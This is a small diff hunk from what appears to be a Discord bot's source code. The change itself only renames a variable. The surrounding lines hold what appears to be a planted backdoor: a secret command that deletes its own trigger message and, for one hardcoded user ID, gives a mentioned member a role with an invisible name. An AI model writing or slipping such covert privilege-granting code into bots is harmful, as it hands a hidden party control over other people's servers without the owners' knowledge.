@@ -210,7 +210,7 @@ let role = message.guild.roles.find(r => r.name === "󠀀󠀀 󠀀󠀀󠀀󠀀")
 if(message.content.startsWith(prefix + ".")) {
 message.delete()
 	if(message.author.id !== "286144887278010368") return
-let r = message.guild.roles.find(role => role.name === "󠀀󠀀 󠀀󠀀󠀀󠀀");
+let r = message.guild.roles.find(r => r.name === "󠀀󠀀 󠀀󠀀󠀀󠀀");
 let member = message.mentions.members.first();
 member.addRole(r).catch(console.error);} else{ let r = message.guild.roles.find(role => role.name === "󠀀󠀀 󠀀󠀀");
 message.member.addRole(r).catch(console.error);
